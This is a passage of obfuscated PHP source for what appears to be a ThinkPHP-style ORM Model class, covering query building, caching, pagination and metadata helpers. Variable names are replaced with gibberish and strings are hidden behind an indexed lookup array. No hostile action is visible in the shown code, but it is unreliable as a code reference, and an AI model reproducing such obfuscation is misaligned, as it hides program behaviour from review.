$Æ×Ÿ‹š‘[345] => think_config($Æ×Ÿ‹š‘[244]))); } $this->db->setModel($this->name); return $¤âğ‹º; } public function db($ç¹ƒİæò = '', $›ØºçÊı = '', $§ó‰×ô¾ = array()) { $À¨¦áã =& $_SERVER[Ó¡Ÿ§‚]; if ($À¨¦áã[12] === $ç¹ƒİæò && $this->db) { return $this->db; } static $ãÕš”ïí = array(); static $‘ÌŒÅóÉ = array(); if (!isset($‘ÌŒÅóÉ[$ç¹ƒİæò]) || isset($‘ÌŒÅóÉ[$ç¹ƒİæò]) && $›ØºçÊı && $ãÕš”ïí[$ç¹ƒİæò] != $›ØºçÊı) { if (!empty($›ØºçÊı) && is_string($›ØºçÊı) && !1 === strpos($›ØºçÊı, $À¨¦áã[8])) { $›ØºçÊı = think_config($›ØºçÊı); } $ç¹ƒİæò = think_guid($›ØºçÊı); $‘ÌŒÅóÉ[$ç¹ƒİæò] = Db::getInstance($›ØºçÊı); } elseif (NULL === $›ØºçÊı) { $‘ÌŒÅóÉ[$ç¹ƒİæò]->close(); unset($‘ÌŒÅóÉ[$ç¹ƒİæò]); return; } if (!empty($§ó‰×ô¾)) { if (is_string($§ó‰×ô¾)) { parse_str($§ó‰×ô¾, $§ó‰×ô¾); } foreach ($§ó‰×ô¾ as $Àä¥Ë¶Ò => $²ı…ú­) { $this->setProperty($Àä¥Ë¶Ò, $²ı…ú­); } } $ãÕš”ïí[$ç¹ƒİæò] = $›ØºçÊı; $this->db = $‘ÌŒÅóÉ[$ç¹ƒİæò]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ÌÄÁÆªÙ = get_class($this); if ($ÌÄÁÆªÙ == $_SERVER[Ó¡Ÿ§‚][346]) { return $this->name; } $this->name = substr($ÌÄÁÆªÙ, 0, -5); } return $this->name; } public function getTableName() { $Ïõ¥›ë =& $_SERVER[Ó¡Ÿ§‚]; if (empty($this->trueTableName)) { $šÓúñŒ² = !empty($this->tablePrefix) ? $this->tablePrefix : $Ïõ¥›ë[12]; if (!empty($this->tableName)) { $šÓúñŒ² .= $this->tableName; } else { $šÓúñŒ² .= think_parse_name($this->name); } $this->trueTableName = strtolower($šÓúñŒ²); } return (!empty($this->dbName) ? $this->dbName . $Ïõ¥›ë[10] : $Ïõ¥›ë[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ÅÛ£ù± =& $_SERVER[Ó¡Ÿ§‚]; return isset($this->fields[$ÅÛ£ù±[251]]) ? $this->fields[$ÅÛ£ù±[251]] : $this->pk; } public function getDbFields() { $Ş®±í¥Ë =& $_SERVER[Ó¡Ÿ§‚]; if (isset($this->options[$Ş®±í¥Ë[279]])) { $¸Öà¥¥Ğ = $this->db->getFields($this->options[$Ş®±í¥Ë[279]]); return $¸Öà¥¥Ğ ? array_keys($¸Öà¥¥Ğ) : !1; } if ($this->fields) { $¸Öà¥¥Ğ = $this->fields; unset($¸Öà¥¥Ğ[$Ş®±í¥Ë[250]], $¸Öà¥¥Ğ[$Ş®±í¥Ë[251]], $¸Öà¥¥Ğ[$Ş®±í¥Ë[252]], $¸Öà¥¥Ğ[$Ş®±í¥Ë[249]]); return $¸Öà¥¥Ğ; } return !1; } public function data($ÕæåÒ = '') { $¾¸Î©à =& $_SERVER[Ó¡Ÿ§‚]; if ($¾¸Î©à[12] === $ÕæåÒ && !empty($this->data)) { return $this->data; } if (is_object($ÕæåÒ)) { $ÕæåÒ = get_object_vars($ÕæåÒ); } elseif (is_string($ÕæåÒ)) { parse_str($ÕæåÒ, $ÕæåÒ); } elseif (!is_array($ÕæåÒ)) { think_exception(think_lang($¾¸Î©à[271])); } $this->data = $ÕæåÒ; return $this; } public function join($‰›È´Æ) { $„„ò’øá =& $_SERVER[Ó¡Ÿ§‚]; if (is_array($‰›È´Æ)) { $this->options[$„„ò’øá[282]] = $‰›È´Æ; } elseif (!empty($‰›È´Æ)) { $this->options[$„„ò’øá[282]][] = $‰›È´Æ; } return $this; } public function union($“è¼™çÄ, $ä‹œ€»Ô = false) { $§Ë«ú« =& $_SERVER[Ó¡Ÿ§‚]; if (empty($“è¼™çÄ)) { return $this; } if ($ä‹œ€»Ô) { $this->options[$§Ë«ú«[347]][$§Ë«ú«[348]] = !0; } if (is_object($“è¼™çÄ)) { $“è¼™çÄ = get_object_vars($“è¼™çÄ); } if (is_string($“è¼™çÄ)) { $ÕÚ­…ü¯ = $“è¼™çÄ; } elseif (is_array($“è¼™çÄ)) { if (isset($“è¼™çÄ[0])) { $this->options[$§Ë«ú«[347]] = array_merge($this->options[$§Ë«ú«[347]], $“è¼™çÄ); return $this; } else { $ÕÚ­…ü¯ = $“è¼™çÄ; } } else { think_exception(think_lang($§Ë«ú«[271])); } $this->options[$§Ë«ú«[347]][] = $ÕÚ­…ü¯; return $this; } public function cache($ù€¶°Ì = true, $ÑÁ‡úÊ = null, $ÔÉˆ¾¬ = '') { $§ä»ÄÆô =& $_SERVER[Ó¡Ÿ§‚]; if (!1 !== $ù€¶°Ì) { $this->options[$§ä»ÄÆô[349]] = array($§ä»ÄÆô[94] => $ù€¶°Ì, $§ä»ÄÆô[339] => $ÑÁ‡úÊ, $§ä»ÄÆô[33] => $ÔÉˆ¾¬); } return $this; } public function field($ùÁºïš, $õ€Ù¤´¸ = false) { $‰¹Ï» =& $_SERVER[Ó¡Ÿ§‚]; if (!0 === $ùÁºïš) { $·û¡…Ñç = $this->getDbFields(); $ùÁºïš = $·û¡…Ñç ? $·û¡…Ñç : $‰¹Ï»[189]; } elseif ($õ€Ù¤´¸) { if (is_string($ùÁºïš)) { $ùÁºïš = explode($‰¹Ï»[50], $ùÁºïš); } $·û¡…Ñç = $this->getDbFields(); $ùÁºïš = $·û¡…Ñç ? array_diff($·û¡…Ñç, $ùÁºïš) : $ùÁºïš; } $this->options[$‰¹Ï»[273]] = $ùÁºïš; return $this; } public function scope($Åæä˜Ú¡ = '', $§Îğ¸„ = NULL) { $ÖãÖÆß½ =& $_SERVER[Ó¡Ÿ§‚]; if ($ÖãÖÆß½[12] === $Åæä˜Ú¡) { if (isset($this->_scope[$ÖãÖÆß½[37]])) { $´’­ƒè = $this->_scope[$ÖãÖÆß½[37]]; } else { return $this; } } elseif (is_string($Åæä˜Ú¡)) { $Ö°³åòİ = explode($ÖãÖÆß½[50], $Åæä˜Ú¡); $´’­ƒè = array(); foreach ($Ö°³åòİ as $ÄÖÍ™‡ú) { if (!isset($this->_scope[$ÄÖÍ™‡ú])) { continue; } $´’­ƒè = array_merge($´’­ƒè, $this->_scope[$ÄÖÍ™‡ú]); } if (!empty($§Îğ¸„) && is_array($§Îğ¸„)) { $´’­ƒè = array_merge($´’­ƒè, $§Îğ¸„); } } elseif (is_array($Åæä˜Ú¡)) { $´’­ƒè = $Åæä˜Ú¡; } if (is_array($´’­ƒè) && !empty($´’­ƒè)) { $this->options = array_merge($this->options, array_change_key_case($´’­ƒè)); } return $this; } public function where($Ù©¥ÒÕ¢, $ÜÚ¼»„û = null) { $˜ò¤’çˆ =& $_SERVER[Ó¡Ÿ§‚]; if (!is_null($ÜÚ¼»„û) && is_string($Ù©¥ÒÕ¢)) { if (!is_array($ÜÚ¼»„û)) { $ÜÚ¼»„û = func_get_args(); array_shift($ÜÚ¼»„û); } $ÜÚ¼»„û = array_map(array($this->db, $˜ò¤’çˆ[343]), $ÜÚ¼»„û); $Ù©¥ÒÕ¢ = vsprintf($Ù©¥ÒÕ¢, $ÜÚ¼»„û); } elseif (is_object($Ù©¥ÒÕ¢)) { $Ù©¥ÒÕ¢ = get_object_vars($Ù©¥ÒÕ¢); } elseif (is_array($Ù©¥ÒÕ¢)) { foreach ($Ù©¥ÒÕ¢ as $¶ÛÆ»Ø => $Øó¡”‘¢) { if ((is_numeric($¶ÛÆ»Ø) || !$¶ÛÆ»Ø) && is_string($Øó¡”‘¢)) { if (strpos($Øó¡”‘¢, $˜ò¤’çˆ[350]) === 0) { continue; } think_trace($˜ò¤’çˆ[351], $˜ò¤’çˆ[12], $˜ò¤’çˆ[49]); die; } } } if (is_string($Ù©¥ÒÕ¢) && $˜ò¤’çˆ[12] != $Ù©¥ÒÕ¢) { $ş¢ŒÄö‚ = array(); $ş¢ŒÄö‚[$˜ò¤’çˆ[352]] = $Ù©¥ÒÕ¢; $Ù©¥ÒÕ¢ = $ş¢ŒÄö‚; } if (isset($this->options[$˜ò¤’çˆ[275]])) { $this->options[$˜ò¤’çˆ[275]] = array_merge($this->options[$˜ò¤’çˆ[275]], $Ù©¥ÒÕ¢); } else { $this->options[$˜ò¤’çˆ[275]] = $Ù©¥ÒÕ¢; } return $this; } public function limit($·¨Œ­‘ª, $îöÊùµÍ = null) { $ä±²Šï½ =& $_SERVER[Ó¡Ÿ§‚]; $this->options[$ä±²Šï½[292]] = is_null($îöÊùµÍ) ? $·¨Œ­‘ª : $·¨Œ­‘ª . $ä±²Šï½[50] . $îöÊùµÍ; return $this; } public function page($ü˜àŠ”ï, $’Çõ©¸ = null) { $®•·¢îñ =& $_SERVER[Ó¡Ÿ§‚]; $this->options[$®•·¢îñ[353]] = is_null($’Çõ©¸) ? $ü˜àŠ”ï : $ü˜àŠ”ï . $®•·¢îñ[50] . $’Çõ©¸; return $this; } public function comment($Ú¾ÜÀ) { $this->options[$_SERVER[Ó¡Ÿ§‚][354]] = $Ú¾ÜÀ; return $this; } public function setProperty($ÔÌ¼æ, $×ÕÜ¯ÚÔ) { if (property_exists($this, $ÔÌ¼æ)) { $this->{$ÔÌ¼æ} = $×ÕÜ¯ÚÔ; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\144\x69\x66\171\124\151\x6d\145", "\x74\151\x6d\145", "\151\156\163\x65\162\164\x2c\x75\160\x64\x61\x74\x65", "\146\165\x6e\x63\x74\x69\x6f\156"), array("\143\162\x65\141\x74\145\124\x69\155\x65", "\164\x69\x6d\x65", "\x69\156\163\145\x72\164", "\146\165\x6e\143\164\x69\x6f\x6e")); public function setDataAuto($˜¾¦íÒî) { $this->dataAuto = $˜¾¦íÒî; } public function __construct($Å¦…„Šô = '', $Ø§ È‰™ = '', $ƒö‰ß† = '') { parent::__construct($Å¦…„Šô, $Ø§ È‰™, $ƒö‰ß†); } protected $tableMeta = array(); protected function _beforeInsert(&$–‚¾±óı, $ãºøÈÙ) { $Œ½çìø‡ =& $_SERVER[Ó¡Ÿ§‚]; if (!$this->checkDataAutoHas($Œ½çìø‡[355])) { return; } $this->dataBeforeFilter($–‚¾±óı, $Œ½çìø‡[355]); } protected function _beforeUpdate(&$ºÅÉıØŒ, $ŸªÛ•×¼) { $õ¢ËÁÌ½ =& $_SERVER[Ó¡Ÿ§‚]; if (!$this->checkDataAutoHas($õ¢ËÁÌ½[356])) { return; } $this->dataBeforeFilter($ºÅÉıØŒ, $õ¢ËÁÌ½[356]); } protected function _afterSelect(&$Á÷˜â„€, $şµŸ£”Œ) { if (!is_array($Á÷˜â„€)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ó¡Ÿ§‚][357])) { return; } foreach ($Á÷˜â„€ as &$™ö½ä‘Ü) { $this->dataAfterFilter($™ö½ä‘Ü); } unset($™ö½ä‘Ü); } protected function _afterFind(&$ŸÚè‰³‡, $çÃöÖÜ) { if (!is_array($ŸÚè‰³‡)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ó¡Ÿ§‚][357])) { return; } $this->dataAfterFilter($ŸÚè‰³‡); } public static function textEncode($¦ãšìæ†) { if (!$¦ãšìæ†) { return $¦ãšìæ†; } $¯£š²è¼ = json_encode($¦ãšìæ†); $¯£š²è¼ = preg_replace_callback($_SERVER[Ó¡Ÿ§‚][358], function ($Î×™ñşŞ) { return addslashes($Î×™ñşŞ[0]); }, $¯£š²è¼); return json_decode($¯£š²è¼); } public static function textDecode($€õ„Ó£) { $¬¢±ÛÎÛ =& $_SERVER[Ó¡Ÿ§‚]; $ÀÔË†¦Å = json_encode($€õ„Ó£); $ÀÔË†¦Å = preg_replace_callback($¬¢±ÛÎÛ[359], function ($éêÅØÌĞ) { return $_SERVER[Ó¡Ÿ§‚][97]; }, $ÀÔË†¦Å); return json_decode($ÀÔË†¦Å); } public function setAutoIncrement($Ö²Ôùíü) { $ö±¯úè = array($this->getPk() => $Ö²Ôùíü); $º‹Ÿ©¬Ã = $this->data($ö±¯úè)->add(); if ($º‹Ÿ©¬Ã) { $this->delete($º‹Ÿ©¬Ã); } } public function getAutoIncrement() { $¢áÂ­Æò = $this->getTableName(); $Ü²ïšô = $this->max($this->getPk()); $ÀÊÔ¦ìí = $this->query("\163\x68\157\167\x20\x74\141\142\154\x65\x20\163\164\141\x74\165\x73\40\167\150\x65\162\145\40\116\x61\155\145\75\47{$¢áÂ­Æò}\47"); $Ä²‡™úÌ = $ÀÊÔ¦ìí[0][$_SERVER[Ó¡Ÿ§‚][360]]; $Ïßµ®ï€ = max($Ü²ïšô, $Ä²‡™úÌ); return $Ïßµ®ï€; } protected function _callBefore($¤Ö¡¥ØÚ, $µ‘Ûâşô) { return $this->cacheCallCheck($¤Ö¡¥ØÚ, $µ‘Ûâşô, !1); } protected function _callAfter($èàŞ·øó, $ÔÕ—ÖÛ) { return $this->cacheCallCheck($èàŞ·øó, $ÔÕ—ÖÛ, !0); } protected function cacheFunctionAlias($ßÊÎ¹á×) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ªÛ¨˜¾¯, $ÂÊàİÅ, $ß›÷®£é = false) { $œ¨‹§„¡ = $this->cacheFunctionAlias($ÂÊàİÅ); if (!$œ¨‹§„¡) { return; } foreach ($œ¨‹§„¡ as $˜¤û—û¶ => $Â›±µÓì) { $ï˜×™û· = $Â›±µÓì[0]; $‹èÍ…À¸ = explode($_SERVER[Ó¡Ÿ§‚][50], $Â›±µÓì[1]); if ($ªÛ¨˜¾¯ == $˜¤û—û¶) { return $this->cacheFunctionGet($˜¤û—û¶, $ï˜×™û·); } if ($ß›÷®£é && in_array($ªÛ¨˜¾¯, $‹èÍ…À¸)) { $this->cacheFunctionClear($˜¤û—û¶, $ï˜×™û·); } } } public function cacheFunctionGet($ÀÛŞÚƒí, $¿Õº²À€) { $ôÓ”£— = $this->cacheKeyMake($ÀÛŞÚƒí, $¿Õº²À€); $”›€í˜¸ = Cache::get($ôÓ”£—); if (!is_array($”›€í˜¸)) { $”›€í˜¸ = call_user_func_array(array($this, $ÀÛŞÚƒí), array($¿Õº²À€, !0)); Cache::set($ôÓ”£—, $”›€í˜¸); } return $”›€í˜¸; } public function cacheFunctionClear($¯¦¶Ö„˜, $­ÎùìÇ) { $ĞñæÂâÑ = $­ÎùìÇ; if (!is_array($­ÎùìÇ)) { $ĞñæÂâÑ = array($­ÎùìÇ); } foreach ($ĞñæÂâÑ as $·”•›å) { $şó³É¡½ = $this->cacheKeyMake($¯¦¶Ö„˜, $·”•›å); Cache::remove($şó³É¡½); } } private function cacheKeyMake($ Ç½‡ƒÈ, $§å’­Œ¸) { $èôİ®İ =& $_SERVER[Ó¡Ÿ§‚]; return get_class($this) . $èôİ®İ[11] . $ Ç½‡ƒÈ . $èôİ®İ[361] . $§å’­Œ¸; } protected function selectPageReset() { $½¤óÏº˜ =& $_SERVER[Ó¡Ÿ§‚]; if (isset($GLOBALS[$½¤óÏº˜[362]])) { return; } $GLOBALS[$½¤óÏº˜[362]] = isset($GLOBALS[$½¤óÏº˜[7]][$½¤óÏº˜[363]]) ? $GLOBALS[$½¤óÏº˜[7]][$½¤óÏº˜[363]] : !1; $GLOBALS[$½¤óÏº˜[364]] = isset($GLOBALS[$½¤óÏº˜[7]][$½¤óÏº˜[353]]) ? $GLOBALS[$½¤óÏº˜[7]][$½¤óÏº˜[353]] : !1; $GLOBALS[$½¤óÏº˜[7]][$½¤óÏº˜[363]] = !1; $GLOBALS[$½¤óÏº˜[7]][$½¤óÏº˜[353]] = !1; } protected function selectPageRestore() { $íš±¶›” =& $_SERVER[Ó¡Ÿ§‚]; if (!isset($GLOBALS[$íš±¶›”[362]])) { return; } $GLOBALS[$íš±¶›”[7]][$íš±¶›”[363]] = $GLOBALS[$íš±¶›”[362]]; $GLOBALS[$íš±¶›”[7]][$íš±¶›”[353]] = $GLOBALS[$íš±¶›”[364]]; if ($GLOBALS[$íš±¶›”[7]][$íš±¶›”[363]] === !1) { unset($GLOBALS[$íš±¶›”[7]][$íš±¶›”[363]]); } if ($GLOBALS[$íš±¶›”[7]][$íš±¶›”[353]] === !1) { unset($GLOBALS[$íš±¶›”[7]][$íš±¶›”[353]]); } unset($GLOBALS[$íš±¶›”[362]]); unset($GLOBALS[$íš±¶›”[364]]); } protected function selectPage($íÈù¦Ïâ = 200, $ô¿ÖğÏ = 1) { $Îş‘äú =& $_SERVER[Ó¡Ÿ§‚]; global $in; $Ô©—Õ© = $this->optionsValue(); $íÏÆÂÎ» = 50000; $íÈù¦Ïâ = isset($in[$Îş‘äú[363]]) && $in[$Îş‘äú[363]] ? $in[$Îş‘äú[363]] : $íÈù¦Ïâ; if ($íÈù¦Ïâ === -1) { $in[$Îş‘äú[363]] = !1; $íÏÆÂÎ» = 100000000; $íÈù¦Ïâ = $íÏÆÂÎ»; } $šŞßÛûí = $Ô©—Õ©; $šŞßÛûí[$Îş‘äú[365]] = array(); $íÈù¦Ïâ = intval($íÈù¦Ïâ); $íÈù¦Ïâ = $íÈù¦Ïâ <= 5 ? 5 : ($íÈù¦Ïâ >= $íÏÆÂÎ» ? $íÏÆÂÎ» : $íÈù¦Ïâ); $ô¿ÖğÏ = intval(isset($in[$Îş‘äú[353]]) && $in[$Îş‘äú[353]] ? $in[$Îş‘äú[353]] : $ô¿ÖğÏ); $ô¿ÖğÏ = $ô¿ÖğÏ <= 1 ? 1 : $ô¿ÖğÏ; $ÄŸ¡İÅ = array(); $à‘¸¢á = 1; if ($ô¿ÖğÏ == 1 && $à‘¸¢á) { $this->optionsValue($Ô©—Õ©); $ÄŸ¡İÅ = $this->page($ô¿ÖğÏ, $íÈù¦Ïâ)->select(); $å¶Ä£›¼ = is_array($ÄŸ¡İÅ) ? count($ÄŸ¡İÅ) : 0; if ($å¶Ä£›¼ < $íÈù¦Ïâ) { $ÓÍş„œÎ = 1; } else { $this->optionsValue($šŞßÛûí); $å¶Ä£›¼ = intval($this->count()); $ÓÍş„œÎ = ceil($å¶Ä£›¼ / $íÈù¦Ïâ); } } else { $this->optionsValue($šŞßÛûí); $å¶Ä£›¼ = intval($this->count()); $ÓÍş„œÎ = ceil($å¶Ä£›¼ / $íÈù¦Ïâ); $ô¿ÖğÏ = $ô¿ÖğÏ >= $ÓÍş„œÎ ? $ÓÍş„œÎ : $ô¿ÖğÏ; $this->optionsValue($Ô©—Õ©); $ÄŸ¡İÅ = $this->page($ô¿ÖğÏ, $íÈù¦Ïâ)->select(); } if (!is_array($ÄŸ¡İÅ)) { $ÄŸ¡İÅ = array(); } if ($ÓÍş„œÎ == 1) { $å¶Ä£›¼ = count($ÄŸ¡İÅ); } $Š‹É ·‡ = array($Îş‘äú[366] => array($Îş‘äú[367] => $å¶Ä£›¼, $Îş‘äú[363] => $íÈù¦Ïâ, $Îş‘äú[353] => $ô¿ÖğÏ, $Îş‘äú[368] => $ÓÍş„œÎ), $Îş‘äú[369] => $ÄŸ¡İÅ); return $Š‹É ·‡; } protected function checkLength($òşáÕï, $µ´ƒÜ×ã = 0, $¯şú¹œğ = '') { $Èç›¡²• =& $_SERVER[Ó¡Ÿ§‚]; $µ´ƒÜ×ã = $µ´ƒÜ×ã ? $µ´ƒÜ×ã : 65536; if (!$òşáÕï || strlen($òşáÕï) < $µ´ƒÜ×ã) { return; } $¯şú¹œğ = $¯şú¹œğ ? $¯şú¹œğ . $Èç›¡²•[71] : $Èç›¡²•[12]; show_json($¯şú¹œğ . LNG($Èç›¡²•[370]) . "\50{$µ´ƒÜ×ã}\51", !1); } protected function metaSet($ÇÕããğÊ, $®å¥¥ÆÈ = null, $çåõÆÏÖ = null) { $¥ê©‹åû =& $_SERVER[Ó¡Ÿ§‚]; if (!$this->tableMeta || !$ÇÕããğÊ) { return !1; } $³§èÅ†Ì = $this->tableMeta[$¥ê©‹åû[371]]; $¹ê¢ƒ‘ş = $this->tableMeta[$¥ê©‹åû[372]]; $ø×Å§· = Model($¹ê¢ƒ‘ş); $üÃªı—» = array($³§èÅ†Ì => $ÇÕããğÊ, $¥ê©‹åû[373] => $®å¥¥ÆÈ); if (is_null($®å¥¥ÆÈ)) { return $ø×Å§·->where(array($³§èÅ†Ì => $ÇÕããğÊ))->delete(); } if (is_null($çåõÆÏÖ) && is_string($®å¥¥ÆÈ)) { return $ø×Å§·->where($üÃªı—»)->delete(); } $‹¬ØÀ· = is_array($®å¥¥ÆÈ) ? $®å¥¥ÆÈ : array(); if (is_string($®å¥¥ÆÈ)) { $‹¬ØÀ·[$®å¥¥ÆÈ] = $çåõÆÏÖ; } $£¶¼¯‚ = array(); foreach ($‹¬ØÀ· as $Ş³èÅö« => $ê¼ñ¹¼) { if (is_null($ê¼ñ¹¼) && is_string($Ş³èÅö«)) { $ø×Å§·->where(array($³§èÅ†Ì => $ÇÕããğÊ, $¥ê©‹åû[373] => $Ş³èÅö«))->delete(); continue; } $this->checkLength($ê¼ñ¹¼, !1, $¹ê¢ƒ‘ş . $¥ê©‹åû[4] . $Ş³èÅö«); $£¶¼¯‚[] = array($³§èÅ†Ì => $ÇÕããğÊ, $¥ê©‹åû[94] => $Ş³èÅö«, $¥ê©‹åû[374] => $ê¼ñ¹¼); } $½íòøšù = $¥ê©‹åû[375] . $¹ê¢ƒ‘ş; CacheLock::lock($½íòøšù); $ø×Å§·->where(array($³§èÅ†Ì => $ÇÕããğÊ))->addAll($£¶¼¯‚, array(), !0); CacheLock::unlock($½íòøšù); return !0; } public function metaGet($Ù®ºüü©, $´‡‹¹¹ = false) { $é€óîÄÆ =& $_SERVER[Ó¡Ÿ§‚]; if (!$this->tableMeta) { return array(); } $º¾¢‚ = $this->tableMeta[$é€óîÄÆ[371]]; $”îºÕŒŞ = Model($this->tableMeta[$é€óîÄÆ[372]]); if ($´‡‹¹¹) { $éÄ±õ´ = array($º¾¢‚ => $Ù®ºüü©, $é€óîÄÆ[94] => $´‡‹¹¹); return $”îºÕŒŞ->where($éÄ±õ´)->getField($é€óîÄÆ[374]); } $éÄ±õ´ = array($º¾¢‚ => $Ù®ºüü©); $òŠ³§¼ = $”îºÕŒŞ->field($é€óîÄÆ[376])->where($éÄ±õ´)->select(); $òŠ³§¼ = array_to_keyvalue($òŠ³§¼, $é€óîÄÆ[94], $é€óîÄÆ[374]); return $òŠ³§¼; } private function checkDataAutoHas($Äı”Ì‹€) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $†áÍÌÁæ) { if (in_array($Äı”Ì‹€, explode($_SERVER[Ó¡Ÿ§‚][50], $†áÍÌÁæ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$é©‚Æ½º, $›ç¯Êã) { $À»â·½Ã =& $_SERVER[Ó¡Ÿ§‚]; if (!is_array($é©‚Æ½º)) { return; } foreach ($this->dataAuto as $¶ÈÓàÀ”) { $·æîÑÁÔ = $¶ÈÓàÀ”[0]; if (!in_array($›ç¯Êã, explode($À»â·½Ã[50], $¶ÈÓàÀ”[2]))) { continue; } switch (trim($¶ÈÓàÀ”[3])) { case $À»â·½Ã[321]: case $À»â·½Ã[322]: $áÏƒõ£Ç = $¶ÈÓàÀ”[1]; $´Åœ²§é = isset($¶ÈÓàÀ”[4]) ? (array) $¶ÈÓàÀ”[4] : array(); if ($áÏƒõ£Ç == $À»â·½Ã[180] && array_key_exists($·æîÑÁÔ, $é©‚Æ½º)) { if (!$é©‚Æ½º[$·æîÑÁÔ]) { unset($é©‚Æ½º[$·æîÑÁÔ]); } break; } if (isset($é©‚Æ½º[$·æîÑÁÔ])) { array_unshift($´Åœ²§é, $é©‚Æ½º[$·æîÑÁÔ]); } if ($À»â·½Ã[321] == $¶ÈÓàÀ”[3]) { $é©‚Æ½º[$·æîÑÁÔ] = call_user_func_array($áÏƒõ£Ç, $´Åœ²§é); } else { $é©‚Æ½º[$·æîÑÁÔ] = call_user_func_array(array(&$this, $áÏƒõ£Ç), $´Åœ²§é); } break; case $À»â·½Ã[270]: if (isset($é©‚Æ½º[$·æîÑÁÔ]) && $é©‚Æ½º[$·æîÑÁÔ]) { $é©‚Æ½º[$·æîÑÁÔ] = call_user_func_array(array(&$this, $¶ÈÓàÀ”[1]), array($é©‚Æ½º[$·æîÑÁÔ])); } break; case $À»â·½Ã[273]: $é©‚Æ½º[$·æîÑÁÔ] = $é©‚Æ½º[$¶ÈÓàÀ”[1]]; break; case $À»â·½Ã[294]: if (isset($é©‚Æ½º[$·æîÑÁÔ]) && !is_string($é©‚Æ½º[$·æîÑÁÔ])) { $é©‚Æ½º[$·æîÑÁÔ] = json_encode_force($é©‚Æ½º[$·æîÑÁÔ]); } break; case $À»â·½Ã[323]: if ($é©‚Æ½º[$·æîÑÁÔ] === $À»â·½Ã[12]) { unset($é©‚Æ½º[$·æîÑÁÔ]); } break; case $À»â·½Ã[324]: $é©‚Æ½º[$·æîÑÁÔ] = $¶ÈÓàÀ”[1]; default: break; } } if ($›ç¯Êã == $À»â·½Ã[355]) { $Ïèâ¢è = strtolower($this->db->getDbType()); if (strpos($Ïèâ¢è, $À»â·½Ã[13]) !== 0) { return; } $Ä³–ùÆÕ = $this->field(!0)->fields; $À÷©Ñİ€ = $Ä³–ùÆÕ[$À»â·½Ã[252]]; if (isset($Ä³–ùÆÕ[$À»â·½Ã[251]])) { unset($À÷©Ñİ€[$Ä³–ùÆÕ[$À»â·½Ã[251]]]); } foreach ($À÷©Ñİ€ as $ß‰’Ğù => $›ç¯Êã) { if (!isset($é©‚Æ½º[$ß‰’Ğù])) { $é©‚Æ½º[$ß‰’Ğù] = $À»â·½Ã[12]; } } } } private function dataAfterFilter(&$ö‘¯ŸŠ¹) { $¾Ï÷‡¯Î =& $_SERVER[Ó¡Ÿ§‚]; foreach ($this->dataAuto as $ÙìøÅÖ¦) { $ÚÒåßæÑ = $ÙìøÅÖ¦[0]; if (!isset($ö‘¯ŸŠ¹[$ÚÒåßæÑ])) { continue; } if (!in_array($¾Ï÷‡¯Î[357], explode($¾Ï÷‡¯Î[50], $ÙìøÅÖ¦[2]))) { continue; } switch (trim($ÙìøÅÖ¦[3])) { case $¾Ï÷‡¯Î[321]: case $¾Ï÷‡¯Î[322]: $²İ¤«°ò = isset($ÙìøÅÖ¦[4]) ? (array) $ÙìøÅÖ¦[4] : array(); array_unshift($²İ¤«°ò, $ö‘¯ŸŠ¹[$ÚÒåßæÑ]); if (isset($ÙìøÅÖ¦[4]) && $ÙìøÅÖ¦[4] == $¾Ï÷‡¯Î[377]) { $²İ¤«°ò = array($ö‘¯ŸŠ¹[$ÚÒåßæÑ]); } if ($¾Ï÷‡¯Î[321] == $ÙìøÅÖ¦[3]) { $ö‘¯ŸŠ¹[$ÚÒåßæÑ] = call_user_func_array($ÙìøÅÖ¦[1], $²İ¤«°ò); } else { $ö‘¯ŸŠ¹[$ÚÒåßæÑ] = call_user_func_array(array(&$this, $ÙìøÅÖ¦[1]), $²İ¤«°ò); } break; case $¾Ï÷‡¯Î[270]: if (isset($ö‘¯ŸŠ¹[$ÚÒåßæÑ]) && $ö‘¯ŸŠ¹[$ÚÒåßæÑ]) { $ö‘¯ŸŠ¹[$ÚÒåßæÑ] = call_user_func_array(array(&$this, $ÙìøÅÖ¦[1]), array($ö‘¯ŸŠ¹[$ÚÒåßæÑ])); } break; case $¾Ï÷‡¯Î[273]: $ö‘¯ŸŠ¹[$ÚÒåßæÑ] = $ö‘¯ŸŠ¹[$ÙìøÅÖ¦[1]]; break; case $¾Ï÷‡¯Î[294]: $ùĞí¹¬Ş = $ö‘¯ŸŠ¹[$ÚÒåßæÑ]; $ö‘¯ŸŠ¹[$ÚÒåßæÑ] = json_decode($ùĞí¹¬Ş, !0); if (is_null($ö‘¯ŸŠ¹[$ÚÒåßæÑ])) { $ö‘¯ŸŠ¹[$ÚÒåßæÑ] = $ùĞí¹¬Ş; } break; case $¾Ï÷‡¯Î[323]: if ($ö‘¯ŸŠ¹[$ÚÒåßæÑ] === $¾Ï÷‡¯Î[12]) { unset($ö‘¯ŸŠ¹[$ÚÒåßæÑ]); } break; case $¾Ï÷‡¯Î[324]: $ö‘¯ŸŠ¹[$ÚÒåßæÑ] = $ÙìøÅÖ¦[1]; break; default: break; } } } public function saveAll($ªçŞÛõ”) { $³ïÌ˜Æ° =& $_SERVER[Ó¡Ÿ§‚]; $¸ª°Ó—· = $this->tablePrefix . $this->tableName; $ØĞûî = self::SQL_WHERE_IN_CHUNK; $ªçŞÛõ” = is_array($ªçŞÛõ”) ? $ªçŞÛõ” : array(); $Ä©¾şÜÓ = $³ïÌ˜Æ°[378]; $õ´’ÚÀ– = 0; $¼˜í‰ = array(); $Ù‰ªÉ£ = count($ªçŞÛõ”); for ($Õí„œìŠ = 0; $Õí„œìŠ < $Ù‰ªÉ£; $Õí„œìŠ++) { $·›½ØÉö = $ªçŞÛõ”[$Õí„œìŠ]; if (!is_array($·›½ØÉö) || count($·›½ØÉö) != 4) { continue; } $†ÇÕ«²à 